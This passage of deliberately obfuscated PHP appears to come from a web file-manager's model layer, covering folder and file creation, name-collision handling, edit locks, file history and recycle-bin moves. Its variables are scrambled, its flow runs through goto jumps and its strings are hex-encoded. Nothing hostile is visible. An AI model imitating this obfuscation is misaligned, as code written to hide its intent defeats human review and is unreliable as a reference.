strlen($D÷Êæó®ñ¤[$cõßÏœö[2179]]) < 2) { return; } $dÅÏ…¯ç» = "\x4c\x45\x46\124\40\112\117\x49\x4e\40{$this->tablePrefix}\151\x6f\x5f\x73\x6f\165\162\143\x65\x5f\x6d\145\164\141\x20\x6d\x65\x74\x61\x20\157\156\x20\x73\157\165\162\143\145\56\x73\157\165\162\143\145\x49\x44\x20\x3d\x20\x6d\x65\x74\x61\56\163\x6f\165\162\x63\145\111\104"; goto AŸÀÏò•…; AŸÀÏò•…: $Aáß¡Ù¬°é = array(); $EÚÖ–Ç¿õ = str_replace(array($cõßÏœö[217], $cõßÏœö[50], $cõßÏœö[2316]), $cõßÏœö[33], $EÚÖ–Ç¿õ); $EÚÖ–Ç¿õ = $cõßÏœö[2317] . str_replace($cõßÏœö[47], $cõßÏœö[2318], $EÚÖ–Ç¿õ); goto BáÑ“ğÜ“é; BáÑ“ğÜ“é: unset($eï³İ¥…Óî[$cõßÏœö[28]]); foreach ($eï³İ¥…Óî as $aÀ–ŠÆ¤Ï¢ => $DÒ†•ÔŒŠÈ) { $Aáß¡Ù¬°é[$cõßÏœö[2317] . $aÀ–ŠÆ¤Ï¢] = $DÒ†•ÔŒŠÈ; } $dÁí‘²Şàä = array($cõßÏœö[492], $cõßÏœö[2181] . $D÷Êæó®ñ¤[$cõßÏœö[2179]] . $cõßÏœö[2181]); goto A’ìæìøË—; A’ìæìøË—: $Aáß¡Ù¬°é[] = array($cõßÏœö[2319] => $dÁí‘²Şàä, $cõßÏœö[912] => $cõßÏœö[2183], array($cõßÏœö[2320] => $dÁí‘²Şàä, $cõßÏœö[2321] => array($cõßÏœö[7], array($cõßÏœö[425], $cõßÏœö[424])))); $this->join($dÅÏ…¯ç»); $eï³İ¥…Óî = $Aáß¡Ù¬°é; goto E‰ìˆÏÛë÷; E‰ìˆÏÛë÷: } private function _parseSearchWhere($A‰ê¨­‘ã) { goto F§äì­¬ò; AŸÕÓÁ¸ù: if (isset($A‰ê¨­‘ã[$aÜ—äö×¾ò[2179]]) && $A‰ê¨­‘ã[$aÜ—äö×¾ò[2179]]) { $DîŠÀ¸…ÈÔ = $A‰ê¨­‘ã[$aÜ—äö×¾ò[2179]]; $C¶×©Û¡ö = explode($aÜ—äö×¾ò[50], $DîŠÀ¸…ÈÔ); if (strlen($DîŠÀ¸…ÈÔ) > 2 && (substr($DîŠÀ¸…ÈÔ, 0, 1) == $aÜ—äö×¾ò[113] && substr($DîŠÀ¸…ÈÔ, -1) == $aÜ—äö×¾ò[113]) || substr($DîŠÀ¸…ÈÔ, 0, 1) == $aÜ—äö×¾ò[55] && substr($DîŠÀ¸…ÈÔ, -1) == $aÜ—äö×¾ò[55]) { $DîŠÀ¸…ÈÔ = substr($DîŠÀ¸…ÈÔ, 1, -1); $C¶×©Û¡ö = array($DîŠÀ¸…ÈÔ); } $f“Æ ¶Ö¼[$aÜ—äö×¾ò[28]] = array($aÜ—äö×¾ò[492], $aÜ—äö×¾ò[2181] . $DîŠÀ¸…ÈÔ . $aÜ—äö×¾ò[2181]); if (count($C¶×©Û¡ö) > 1) { $f“Æ ¶Ö¼[$aÜ—äö×¾ò[28]] = array(); foreach ($C¶×©Û¡ö as $A’„æ‡å„ø) { if (!trim($A’„æ‡å„ø)) { continue; } $f“Æ ¶Ö¼[$aÜ—äö×¾ò[28]][] = array($aÜ—äö×¾ò[492], $aÜ—äö×¾ò[2181] . trim($A’„æ‡å„ø) . $aÜ—äö×¾ò[2181]); } } } return $f“Æ ¶Ö¼; goto bÁËÀÚèñ‘; a„„ãÍóÂ: if (isset($A‰ê¨­‘ã[$aÜ—äö×¾ò[544]])) { $f“Æ ¶Ö¼[] = array($aÜ—äö×¾ò[388] => $A‰ê¨­‘ã[$aÜ—äö×¾ò[544]], $aÜ—äö×¾ò[387] => $A‰ê¨­‘ã[$aÜ—äö×¾ò[544]], $aÜ—äö×¾ò[912] => $aÜ—äö×¾ò[2183]); } if (isset($A‰ê¨­‘ã[$aÜ—äö×¾ò[381]])) { $d©ƒ»î•‘° = $A‰ê¨­‘ã[$aÜ—äö×¾ò[381]]; if ($d©ƒ»î•‘° == $aÜ—äö×¾ò[76]) { $f“Æ ¶Ö¼[$aÜ—äö×¾ò[379]] = 1; } else { if ($d©ƒ»î•‘° == $aÜ—äö×¾ò[2327]) { $f“Æ ¶Ö¼[$aÜ—äö×¾ò[379]] = 0; } else { if ($d©ƒ»î•‘°) { $d©ƒ»î•‘° = is_array($d©ƒ»î•‘°) ? $d©ƒ»î•‘° : explode($aÜ—äö×¾ò[47], $d©ƒ»î•‘°); $f“Æ ¶Ö¼[$aÜ—äö×¾ò[381]] = array($aÜ—äö×¾ò[393], $d©ƒ»î•‘°); $f“Æ ¶Ö¼[$aÜ—äö×¾ò[379]] = 0; } } } } if (isset($A‰ê¨­‘ã[$aÜ—äö×¾ò[470]])) { $eÁ˜¸ïÇ‡ = $this->sourceInfo($A‰ê¨­‘ã[$aÜ—äö×¾ò[470]]); $f“Æ ¶Ö¼[$aÜ—äö×¾ò[534]] = array($aÜ—äö×¾ò[492], $eÁ˜¸ïÇ‡[$aÜ—äö×¾ò[468]] . $A‰ê¨­‘ã[$aÜ—äö×¾ò[470]] . $aÜ—äö×¾ò[493]); } goto AŸÕÓÁ¸ù; F§äì­¬ò: $aÜ—äö×¾ò =& $_SERVER[í…¶]; $f“Æ ¶Ö¼ = array(); if (isset($A‰ê¨­‘ã[$aÜ—äö×¾ò[704]])) { $f“Æ ¶Ö¼[$aÜ—äö×¾ò[107]] = array($aÜ—äö×¾ò[2322], $A‰ê¨­‘ã[$aÜ—äö×¾ò[704]]); } goto bÖ¸©Ìˆ­Ì; bÖ¸©Ìˆ­Ì: if (isset($A‰ê¨­‘ã[$aÜ—äö×¾ò[705]])) { $d¼ÌÇË›©ğ = array($aÜ—äö×¾ò[2323], $A‰ê¨­‘ã[$aÜ—äö×¾ò[705]]); if ($f“Æ ¶Ö¼[$aÜ—äö×¾ò[107]]) { $f“Æ ¶Ö¼[$aÜ—äö×¾ò[107]] = array($f“Æ ¶Ö¼[$aÜ—äö×¾ò[107]], $d¼ÌÇË›©ğ, $aÜ—äö×¾ò[2324]); } else { $f“Æ ¶Ö¼[$aÜ—äö×¾ò[107]] = $d¼ÌÇË›©ğ; } } if (isset($A‰ê¨­‘ã[$aÜ—äö×¾ò[2325]])) { $f“Æ ¶Ö¼[$aÜ—äö×¾ò[77]] = array($aÜ—äö×¾ò[2322], $A‰ê¨­‘ã[$aÜ—äö×¾ò[2325]]); } if (isset($A‰ê¨­‘ã[$aÜ—äö×¾ò[2326]])) { $d¼ÌÇË›©ğ = array($aÜ—äö×¾ò[2323], $A‰ê¨­‘ã[$aÜ—äö×¾ò[2326]]); if ($f“Æ ¶Ö¼[$aÜ—äö×¾ò[77]]) { $f“Æ ¶Ö¼[$aÜ—äö×¾ò[77]] = array($f“Æ ¶Ö¼[$aÜ—äö×¾ò[77]], $d¼ÌÇË›©ğ, $aÜ—äö×¾ò[2324]); } else { $f“Æ ¶Ö¼[$aÜ—äö×¾ò[77]] = $d¼ÌÇË›©ğ; } } goto a„„ãÍóÂ; bÁËÀÚèñ‘: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($E÷…‚Ñ„ö) { $b›±ˆïâ•× =& $_SERVER[í…¶]; $Fšà‰¬ˆÙí = Model($b›±ˆïâ•×[483])->where(array($b›±ˆïâ•×[1424] => $E÷…‚Ñ„ö))->find(); $f»õØìÀÛ = $this->_mkdirRoot(SourceModel::TYPE_USER, $E÷…‚Ñ„ö, $Fšà‰¬ˆÙí[$b›±ˆïâ•×[28]]); $this->userDesktopAdd($f»õØìÀÛ); return $f»õØìÀÛ; } public function userDesktopAdd($Bš¸¼ßâ‡š) { $d™õë¬±‰à =& $_SERVER[í…¶]; $fÙï§…éà = LNG($d™õë¬±‰à[2328]); $CËí°‡î“£ = $this->mkdir($Bš¸¼ßâ‡š, $fÙï§…éà); $this->metaSet($CËí°‡î“£, $d™õë¬±‰à[2329], $d™õë¬±‰à[83]); $this->metaSet($Bš¸¼ßâ‡š, $d™õë¬±‰à[2330], $CËí°‡î“£); } public function groupRootAdd($fÙ¨Ü¾˜Ø) { $fŒÃ¶‹ÓÔ˜ =& $_SERVER[í…¶]; $DŠ¥±ã»›† = Model($fŒÃ¶‹ÓÔ˜[467])->where(array($fŒÃ¶‹ÓÔ˜[2175] => $fÙ¨Ü¾˜Ø))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $fÙ¨Ü¾˜Ø, $DŠ¥±ã»›†[$fŒÃ¶‹ÓÔ˜[28]]); } public function systemRootPathAdd($B¢…±ØòÑÃ) { if ($B¢…±ØòÑÃ != $_SERVER[í…¶][1087]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $B¢…±ØòÑÃ); } public function userRootRemove($cÖ èï¦¤¦) { $e—ïÈ­í„… = $this->sourceRoot(SourceModel::TYPE_USER, $cÖ èï¦¤¦); if (!$e—ïÈ­í„…) { return; } $this->remove($e—ïÈ­í„…, !1); } public function groupRootRemove($FÂ°Îå¦ƒ) { $F¾õœÆµÂµ = $this->sourceRoot(SourceModel::TYPE_GROUP, $FÂ°Îå¦ƒ); if (!$F¾õœÆµÂµ) { return; } $this->remove($F¾õœÆµÂµ, !1); } private function _mkdirRoot($AÁ™ŠßÊ, $BˆçïùÌ˜Ø, $BåÒò„¤’’) { goto DóÛ¨‰¤´æ; DóÛ¨‰¤´æ: $A¨«¥Û–ß® =& $_SERVER[í…¶]; $a‡Éäİ´ÕË = array($A¨«¥Û–ß®[377] => 0, $A¨«¥Û–ß®[530] => $AÁ™ŠßÊ, $A¨«¥Û–ß®[531] => $BˆçïùÌ˜Ø, $A¨«¥Û–ß®[527] => 1, $A¨«¥Û–ß®[532] => USER_ID, $A¨«¥Û–ß®[533] => USER_ID, $A¨«¥Û–ß®[528] => $A¨«¥Û–ß®[33], $A¨«¥Û–ß®[534] => $A¨«¥Û–ß®[479], $A¨«¥Û–ß®[405] => 0, $A¨«¥Û–ß®[529] => 0, $A¨«¥Û–ß®[429] => 0, $A¨«¥Û–ß®[535] => $A¨«¥Û–ß®[33]); if ($b¢Œ‘ù¸ªœ = $this->where($a‡Éäİ´ÕË)->find()) { return $b¢Œ‘ù¸ªœ[$A¨«¥Û–ß®[378]]; } goto D£Ì·ºŸÂ; D£Ì·ºŸÂ: $d©¼Ø¥ÙÉ  = "\x4d\x6f\x64\145\154\x53\157\165\162\143\x65\x2e\x6d\x6b\x64\x69\162\122\157\x6f\164\x2e{$AÁ™ŠßÊ}\x2e{$BˆçïùÌ˜Ø}\56" . $BåÒò„¤’’; CacheLock::lock($d©¼Ø¥ÙÉ ); $a‡Éäİ´ÕË[$A¨«¥Û–ß®[28]] = $BåÒò„¤’’; goto e™÷Ì×ÅÎ; e™÷Ì×ÅÎ: $D×Œ†‘¶› = $this->add($a‡Éäİ´ÕË); $EÒÊÌŒã = array($A¨«¥Û–ß®[536] => short_id($D×Œ†‘¶›)); $this->where(array($A¨«¥Û–ß®[392] => $D×Œ†‘¶›))->save($EÒÊÌŒã); goto FöÇ¡¸ßËŒ; FöÇ¡¸ßËŒ: CacheLock::unlock($d©¼Ø¥ÙÉ ); return $D×Œ†‘¶›; goto c¨ØÊ•„; c¨ØÊ•„: } private function sourceRoot($f®†… …éÕ, $Fìô¸–‡óÚ, $Bîè‰ƒï§ = false) { $F”‰¼„ùÂĞ =& $_SERVER[í…¶]; $f§¹…£¯½ = array($F”‰¼„ùÂĞ[377] => 0, $F”‰¼„ùÂĞ[530] => $f®†… …éÕ, $F”‰¼„ùÂĞ[531] => $Fìô¸–‡óÚ); if ($Có£ï¯ëƒ = $this->where($f§¹…£¯½)->find()) { return $Bîè‰ƒï§ ? $Có£ï¯ëƒ : $Có£ï¯ëƒ[$F”‰¼„ùÂĞ[378]]; } return !1; } public function sourceRootGroup($CÒĞ±¦Şäã) { $FÄ¥Á´íÏ =& $_SERVER[í…¶]; if (is_string($CÒĞ±¦Şäã)) { $CÒĞ±¦Şäã = array($CÒĞ±¦Şäã); } $AÌêíà¢ = array($FÄ¥Á´íÏ[377] => 0, $FÄ¥Á´íÏ[530] => SourceModel::TYPE_GROUP, $FÄ¥Á´íÏ[531] => array($FÄ¥Á´íÏ[7], $CÒĞ±¦Şäã)); $EÑòÙ¨Ø¾ = $this->listSource($AÌêíà¢, 1000); return array_to_keyvalue($EÑòÙ¨Ø¾[$FÄ¥Á´íÏ[74]], $FÄ¥Á´íÏ[465]); } public function mkfile($CÂŸ¦í±ñÂ, $AòŠ‰™Ò˜, $côÍÚÈ¨„Ú = '', $e˜Å¬—†Ä£ = REPEAT_RENAME) { $a÷áñÅñ¨¥ =& $_SERVER[í…¶]; $a˜´ôí§´Ó = Model($a÷áñÅñ¨¥[553])->addFileByContent($côÍÚÈ¨„Ú, $AòŠ‰™Ò˜); return $this->_createFileCall($CÂŸ¦í±ñÂ, $AòŠ‰™Ò˜, $a˜´ôí§´Ó, $e˜Å¬—†Ä£, $a÷áñÅñ¨¥[1124]); } public function addFile($D­¢‹›‡…´, $CÀğ¡áåÌÍ, $D‡èŞÒÓà, $Cäß‡Å‰¤ = false, $fóŒÈçÈˆĞ = REPEAT_RENAME) { $dÈšìãóØ¯ = Model($_SERVER[í…¶][553])->addFile($CÀğ¡áåÌÍ, $D‡èŞÒÓà, $Cäß‡Å‰¤); return $this->_createFileCall($D­¢‹›‡…´, $D‡èŞÒÓà, $dÈšìãóØ¯, $fóŒÈçÈˆĞ); } public function addFileByFileID($FŸöÚ¼Œ®ƒ, $D¹†œ’ó”‘, $fÁ‘ôÛ‹£†, $F°ø¼µ—Œá = REPEAT_RENAME) { $E¤¢÷ºƒ÷µ =& $_SERVER[í…¶]; $A„¨¤øœÙÉ = Model($E¤¢÷ºƒ÷µ[553])->find($D¹†œ’ó”‘); Model($E¤¢÷ºƒ÷µ[553])->linkAdd($D¹†œ’ó”‘); return $this->_createFileCall($FŸöÚ¼Œ®ƒ, $fÁ‘ôÛ‹£†, $A„¨¤øœÙÉ, $F°ø¼µ—Œá); } public function addFileByRemote($A‡éĞÍÏğÕ, $FÕŒÆ•à, $fà’Ø½ùÍ, $d™º…×»§ = array(), $cŞåÀ³Ñ„ß = REPEAT_RENAME) { $DÅ‡¬„à„ = Model($_SERVER[í…¶][553])->addFileByRemote($FÕŒÆ•à, $fà’Ø½ùÍ, $d™º…×»§); return $this->_createFileCall($A‡éĞÍÏğÕ, $fà’Ø½ùÍ, $DÅ‡¬„à„, $cŞåÀ³Ñ„ß); } private function _createFileCall($F£îÑœÑ–°, $aµ†ë¹ÊĞ, $c…ºÙä¤™ï, $C©ˆ…½ø¾Û, $FÚ‚¨‹ó§¾ = "\165\160\x6c\157\x61\144") { goto DîÓù¶·ùí; Aš§–Ñù¡à: $d†ÙâÄÇŞ© = $this->_createFile($F£îÑœÑ–°, $aµ†ë¹ÊĞ, $c…ºÙä¤™ï, $C©ˆ…½ø¾Û, $dŠ˜†Ú•î§); if (!$dŠ˜†Ú•î§) { Model($D«âËÑŸÇÜ[431])->remove($c…ºÙä¤™ï[$D«âËÑŸÇÜ[428]]); } else { if ($d†ÙâÄÇŞ©) { Model($D«âËÑŸÇÜ[2301])->eventCreate($d†ÙâÄÇŞ©, $FÚ‚¨‹ó§¾); } } $this->lockWriteEnd($F£îÑœÑ–°, $aµ†ë¹ÊĞ); goto C¸—Äù¬‚; C¸—Äù¬‚: return $d†ÙâÄÇŞ©; goto eÅ–¤•­¦É; DîÓù¶·ùí: $D«âËÑŸÇÜ =& $_SERVER[í…¶]; $dŠ˜†Ú•î§ = !1; $this->lockWriteStart($F£îÑœÑ–°, $aµ†ë¹ÊĞ); goto Aš§–Ñù¡à; eÅ–¤•­¦É: } public function mkdir($f—ôÓä¬šö, $DóªØ—¾¯İ, $f³‚÷±Ø„Û = REPEAT_SKIP) { goto ašµ‡ßˆ¶Æ; E©æáöáœ‚: $c¯¤‘ë”–ˆ = $this->_addSoure($a”¨»Ò§Ô…, $B½ˆ¯ùİÏ); Model($b¤Ê‰‰À¦[2301])->eventCreate($c¯¤‘ë”–ˆ, $b¤Ê‰‰À¦[1125]); $this->lockWriteEnd($f—ôÓä¬šö, $DóªØ—¾¯İ); goto C°‰²»È›«; ašµ‡ßˆ¶Æ: $b¤Ê‰‰À¦ =& $_SERVER[í…¶]; $B½ˆ¯ùİÏ = $this->sourceInfo($f—ôÓä¬šö); if (!$B½ˆ¯ùİÏ) { return !1; } goto fÀ¤ƒĞï¨; fÀ¤ƒĞï¨: $this->lockWriteStart($f—ôÓä¬šö, $DóªØ—¾¯İ); if ($f³‚÷±Ø„Û !== !1) { $dÔÒÅ¸î–ƒ = $this->fileNameExist($f—ôÓä¬šö, $DóªØ—¾¯İ); if ($dÔÒÅ¸î–ƒ && $f³‚÷±Ø„Û != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($f—ôÓä¬šö, $DóªØ—¾¯İ); return $dÔÒÅ¸î–ƒ; } $DóªØ—¾¯İ = $this->fileNameAuto($f—ôÓä¬šö, $DóªØ—¾¯İ, $f³‚÷±Ø„Û); } $a”¨»Ò§Ô… = array($b¤Ê‰‰À¦[527] => 1, $b¤Ê‰‰À¦[395] => $DóªØ—¾¯İ, $b¤Ê‰‰À¦[528] => $b¤Ê‰‰À¦[33], $b¤Ê‰‰À¦[429] => 0, $b¤Ê‰‰À¦[529] => 0); goto E©æáöáœ‚; C°‰²»È›«: return $c¯¤‘ë”–ˆ; goto dñë˜ËÎà; dñë˜ËÎà: } private function _createFile($eŒù¹ù®é, $dØ˜ÓÀğ¿, $CƒÂË, $cÛ¢î­º‰ˆ, &$BµÎœ Îïæ) { goto a¦ïõ°„äÎ; bô¹™Üç‰: return $d¸åİ‘Ãò; goto FÒ°‚İÑ‰ƒ; AÖ¦ä‚§¥Á: if ($cÛ¢î­º‰ˆ !== !1) { $dŒ–ÛÒ¸ñ“ = $this->fileNameExist($eŒù¹ù®é, $dØ˜ÓÀğ¿); } $BµÎœ Îïæ = !0; if ($cÛ¢î­º‰ˆ && $dŒ–ÛÒ¸ñ“) { if ($cÛ¢î­º‰ˆ == REPEAT_SKIP) { $BµÎœ Îïæ = !1; return $dŒ–ÛÒ¸ñ“; } else { if ($cÛ¢î­º‰ˆ == REPEAT_REPLACE) { $eÍÊ‹ï¯é´ = $this->sourceInfo($dŒ–ÛÒ¸ñ“); $Fï¯¦‘‡Ô = $this->fileHistory($eÍÊ‹ï¯é´, $CƒÂË[$A¾íùî©Á[428]], $CƒÂË[$A¾íùî©Á[77]]); if (!$Fï¯¦‘‡Ô) { $BµÎœ Îïæ = !1; } else { $this->folderSizeReset($eŒù¹ù®é); } return $dŒ–ÛÒ¸ñ“; } else { $dØ˜ÓÀğ¿ = $this->fileNameAuto($eŒù¹ù®é, $dØ˜ÓÀğ¿, $cÛ¢î­º‰ˆ, !1); } } } goto aá˜×§¾•; a¦ïõ°„äÎ: $A¾íùî©Á =& $_SERVER[í…¶]; $cƒšèß”×Õ = $this->sourceInfo($eŒù¹ù®é); if (!$CƒÂË || !$cƒšèß”×Õ) { return !1; } goto AÖ¦ä‚§¥Á; aá˜×§¾•: $E×Æßá« = array($A¾íùî©Á[527] => 0, $A¾íùî©Á[395] => $dØ˜ÓÀğ¿, $A¾íùî©Á[528] => get_path_ext($dØ˜ÓÀğ¿), $A¾íùî©Á[429] => $CƒÂË[$A¾íùî©Á[428]], $A¾íùî©Á[529] => $CƒÂË[$A¾íùî©Á[77]]); $d¸åİ‘Ãò = $this->_addSoure($E×Æßá«, $cƒšèß”×Õ); $this->folderSizeReset($eŒù¹ù®é); goto bô¹™Üç‰; FÒ°‚İÑ‰ƒ: } protected function fileHistory($Bì«¿®íˆ¾, $CØ¥ÊõóÍß, $dêºÀµ ÊŒ) { goto C°„Òô£¨ç; f‡É°ù“’: return !0; goto CÏğ¼å²†; C°„Òô£¨ç: $Dá¶îÆø® =& $_SERVER[í…¶]; if ($Bì«¿®íˆ¾[$Dá¶îÆø®[428]] == $CØ¥ÊõóÍß) { return !1; } $this->checkLock($Bì«¿®íˆ¾[$Dá¶îÆø®[378]], $CØ¥ÊõóÍß); goto bŒï±‰¹óø; bŒï±‰¹óø: Model($Dá¶îÆø®[2331])->addHistory($Bì«¿®íˆ¾); $EÇì™¶÷™ç = array($Dá¶îÆø®[533] => USER_ID, $Dá¶îÆø®[399] => time(), $Dá¶îÆø®[428] => $CØ¥ÊõóÍß, $Dá¶îÆø®[77] => $dêºÀµ ÊŒ); $this->where(array($Dá¶îÆø®[392] => $Bì«¿®íˆ¾[$Dá¶îÆø®[378]]))->save($EÇì™¶÷™ç); goto f‡É°ù“’; CÏğ¼å²†: } public function checkLock($AÜ¦–»Û–—, $cÚ‚øÅË‘µ) { goto B±Š„“„«; AøñˆœÑá: $this->_createFileCall($E„•ªŒéª[$f¥ÁŒŞÀÔ[470]], $C¢´¦º•ô, $D‹œ“˜ø‰¤, REPEAT_REPLACE, $f¥ÁŒŞÀÔ[1124]); $dÍïÉ…¸ = $E„•ªŒéª[$f¥ÁŒŞÀÔ[426]][$f¥ÁŒŞÀÔ[490]]; $D›™ö†Š… = $dÍïÉ…¸[$f¥ÁŒŞÀÔ[2333]] ? $dÍïÉ…¸[$f¥ÁŒŞÀÔ[2333]] : $dÍïÉ…¸[$f¥ÁŒŞÀÔ[28]]; goto b…Î´‚ƒ¶½; B±Š„“„«: $f¥ÁŒŞÀÔ =& $_SERVER[í…¶]; $E„•ªŒéª = $this->pathInfo($AÜ¦–»Û–—); if (!$this->fileIsLock($E„•ªŒéª, !0)) { return; } goto B‹İàµ‹Õö; B‹İàµ‹Õö: $B²³Ñºˆ¦ = Session::get($f¥ÁŒŞÀÔ[2332]); $C¢´¦º•ô = substr($E„•ªŒéª[$f¥ÁŒŞÀÔ[28]], 0, -1 - strlen($E„•ªŒéª[$f¥ÁŒŞÀÔ[160]])) . $f¥ÁŒŞÀÔ[1386] . $B²³Ñºˆ¦ . $f¥ÁŒŞÀÔ[91] . $E„•ªŒéª[$f¥ÁŒŞÀÔ[160]]; $D‹œ“˜ø‰¤ = Model($f¥ÁŒŞÀÔ[553])->find($cÚ‚øÅË‘µ); goto AøñˆœÑá; b…Î´‚ƒ¶½: show_json(LNG($f¥ÁŒŞÀÔ[2334]) . $f¥ÁŒŞÀÔ[2335] . LNG($f¥ÁŒŞÀÔ[2336]) . $f¥ÁŒŞÀÔ[2337] . $D›™ö†Š… . $f¥ÁŒŞÀÔ[2338], !1); goto AáÄì„ÕÀâ; AáÄì„ÕÀâ: } public function fileIsLock($aŸ¹Õ—ÁìÅ, $dÈÜ¢Ãƒ“à = false) { goto b¯æŠáÔ†¾; E–ƒ»ï­‡Œ: $aÀ·‰ÉÚĞ = $GLOBALS[$cÇÖÑîÍÃÏ[6]][$cÇÖÑîÍÃÏ[84]][$cÇÖÑîÍÃÏ[488]]; if ($aŸ¹Õ—ÁìÅ[$cÇÖÑîÍÃÏ[426]][$cÇÖÑîÍÃÏ[489]] <= time() - $aÀ·‰ÉÚĞ) { $this->metaSet($aŸ¹Õ—ÁìÅ[$cÇÖÑîÍÃÏ[378]], $cÇÖÑîÍÃÏ[487], null); $this->metaSet($aŸ¹Õ—ÁìÅ[$cÇÖÑîÍÃÏ[378]], $cÇÖÑîÍÃÏ[489], null); } if ($dÈÜ¢Ãƒ“à) { $this->metaSet($aŸ¹Õ—ÁìÅ[$cÇÖÑîÍÃÏ[378]], $cÇÖÑîÍÃÏ[489], time()); } goto aòöƒµˆ¶˜; b¯æŠáÔ†¾: $cÇÖÑîÍÃÏ =& $_SERVER[í…¶]; if (!isset($aŸ¹Õ—ÁìÅ[$cÇÖÑîÍÃÏ[426]]) || !$aŸ¹Õ—ÁìÅ[$cÇÖÑîÍÃÏ[426]][$cÇÖÑîÍÃÏ[487]]) { return !1; } if ($aŸ¹Õ—ÁìÅ[$cÇÖÑîÍÃÏ[426]][$cÇÖÑîÍÃÏ[487]] != USER_ID) { return !0; } goto E–ƒ»ï­‡Œ; aòöƒµˆ¶˜: return !1; goto B„Ù’¨÷İ½; B„Ù’¨÷İ½: } private function _addSoure($DóáŞùÓí­, $c“ò—¹¨¶‡) { goto e÷†¾éÜÉ; c°Ûö§õÚï: return $c»¦‚æ³·á; goto c¨‡ÛØé²¤; Bß¾†š’ˆ: $fƒæµçÍÀ = array($Aùô–§ƒ•„[536] => short_id($c»¦‚æ³·á)); $this->where(array($Aùô–§ƒ•„[392] => $c»¦‚æ³·á))->save($fƒæµçÍÀ); $this->setNamePinyin($c»¦‚æ³·á, $DóáŞùÓí­[$Aùô–§ƒ•„[28]]); goto c°Ûö§õÚï; AÛ¾°ó„¼: static $bŠ©“Û™ = false; if (!$bŠ©“Û™) { Hook::trigger($Aùô–§ƒ•„[517], $DóáŞùÓí­); $bŠ©“Û™ = !0; } $c»¦‚æ³·á = $this->add($DóáŞùÓí­); goto Bß¾†š’ˆ; e÷†¾éÜÉ: $Aùô–§ƒ•„ =& $_SERVER[í…¶]; $EÍ²â†£¬ø = array($Aùô–§ƒ•„[530] => $c“ò—¹¨¶‡[$Aùô–§ƒ•„[380]], $Aùô–§ƒ•„[531] => $c“ò—¹¨¶‡[$Aùô–§ƒ•„[465]], $Aùô–§ƒ•„[532] => USER_ID, $Aùô–§ƒ•„[533] => USER_ID, $Aùô–§ƒ•„[377] => $c“ò—¹¨¶‡[$Aùô–§ƒ•„[378]], $Aùô–§ƒ•„[534] => $c“ò—¹¨¶‡[$Aùô–§ƒ•„[468]] . $c“ò—¹¨¶‡[$Aùô–§ƒ•„[378]] . $Aùô–§ƒ•„[47], $Aùô–§ƒ•„[405] => 0, $Aùô–§ƒ•„[535] => $Aùô–§ƒ•„[33]); $DóáŞùÓí­ = array_merge($EÍ²â†£¬ø, $DóáŞùÓí­); goto bÁåŸåÓÎ¶; bÁåŸåÓÎ¶: $this->updateModifyTime($DóáŞùÓí­[$Aùô–§ƒ•„[470]]); $AÛÜ¤¼´ = $Aùô–§ƒ•„[2339] . $c“ò—¹¨¶‡[$Aùô–§ƒ•„[378]]; if (isset(self::$cacheChildList[$AÛÜ¤¼´])) { unset(self::$cacheChildList[$AÛÜ¤¼´]); } goto AÛ¾°ó„¼; c¨‡ÛØé²¤: } public function remove($e˜ä—¹à¬Ì, $B¬ÒêƒØå§ = true) { goto AóÀ†ÖŸÊ; dØ„”ÖŞÊ: $E‚á„·É· = $C´Áêñİ·[$fñò§®³Ö¨[380]] == self::TYPE_USER ? $fñò§®³Ö¨[544] : $fñò§®³Ö¨[969]; if ($E‚á„·É· == $fñò§®³Ö¨[544]) { $bĞ±Ä ê = Model($fñò§®³Ö¨[483])->getInfo($C´Áêñİ·[$fñò§®³Ö¨[465]]); $eãØ³ÚâõÂ = !empty($bĞ±Ä ê[$fñò§®³Ö¨[2333]]) ? $bĞ±Ä ê[$fñò§®³Ö¨[2333]] : $bĞ±Ä ê[$fñò§®³Ö¨[28]]; $eãØ³ÚâõÂ = $fñò§®³Ö¨[248] . $eãØ³ÚâõÂ . $fñò§®³Ö¨[2341] . $C´Áêñİ·[$fñò§®³Ö¨[465]]; } else { $bĞ±Ä ê = Model($fñò§®³Ö¨[467])->getInfo($C´Áêñİ·[$fñò§®³Ö¨[465]]); $eãØ³ÚâõÂ = _get($bĞ±Ä ê, $fñò§®³Ö¨[28]); $eãØ³ÚâõÂ = $fñò§®³Ö¨[157] . $eãØ³ÚâõÂ . $fñò§®³Ö¨[2342] . $C´Áêñİ·[$fñò§®³Ö¨[465]]; } $dÎáğ ¶Ö» = $fñò§®³Ö¨[2343] . md5($eãØ³ÚâõÂ); goto A¶í†ˆŸÙô; A¶í†ˆŸÙô: CacheLock::lock($dÎáğ ¶Ö»); $aæà®Ë¼Ä½ = $this->fileNameExist($Cëİ…Ÿ÷óÕ, $eãØ³ÚâõÂ); if (!$aæà®Ë¼Ä½) { $aæà®Ë¼Ä½ = $this->mkdir($Cëİ…Ÿ÷óÕ, $eãØ³ÚâõÂ, REPEAT_SKIP); $this->metaSet($aæà®Ë¼Ä½, $fñò§®³Ö¨[2344], $E‚á„·É·); $this->metaSet($aæà®Ë¼Ä½, $fñò§®³Ö¨[2345], $C´Áêñİ·[$fñò§®³Ö¨[465]]); if ($C´Áêñİ·[$fñò§®³Ö¨[470]] != 0) { $this->metaSet($aæà®Ë¼Ä½, $fñò§®³Ö¨[2346], _get($bĞ±Ä ê, $fñò§®³Ö¨[2347])); } } goto B„£çŒ„Ñ¶; AóÀ†ÖŸÊ: $fñò§®³Ö¨ =& $_SERVER[í…¶]; $C´Áêñİ· = $this->sourceInfo($e˜ä—¹à¬Ì); $bŸ³¢âÉæ = intval($C´Áêñİ·[$fñò§®³Ö¨[380]]) === self::TYPE_SYSTEM; goto F™‚öÜ°¿Ø; B„£çŒ„Ñ¶: CacheLock::unlock($dÎáğ ¶Ö»); $this->metaSet($e˜ä—¹à¬Ì, $fñò§®³Ö¨[2348], $C´Áêñİ·[$fñò§®³Ö¨[470]]); $this->where(array($fñò§®³Ö¨[378] => $e˜ä—¹à¬Ì))->save(array($fñò§®³Ö¨[399] => time())); goto f‚‰±Œ÷ƒè; f‚‰±Œ÷ƒè: $this->recycleClear($C´Áêñİ·); $A–¢â÷ˆà = $this->move($e˜ä—¹à¬Ì, $aæà®Ë¼Ä½, REPEAT_RENAME_FOLDER); $this->folderSizeReset($C´Áêñİ·[$fñò§®³Ö¨[470]]); goto bØª¶’–¿ä; bØª¶’–¿ä: return $A–¢â÷ˆà; goto aëæÁ´‰¨ç; 